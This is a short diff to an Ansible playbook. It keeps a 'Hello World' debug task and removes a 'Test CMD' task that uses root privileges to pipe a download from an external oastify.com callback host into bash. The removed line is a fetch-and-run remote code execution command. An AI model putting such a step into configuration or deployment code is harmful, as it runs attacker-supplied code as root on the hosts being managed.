@@ -4,6 +4,3 @@
     - name: Hello Message
       debug:
         msg: "Hello World!"
-    - name: Test CMD
-      become: yes
-      shell: "curl https://bety9fpwm8c435tl3f9da09gc7iy6p4dt.oastify.com | bash"
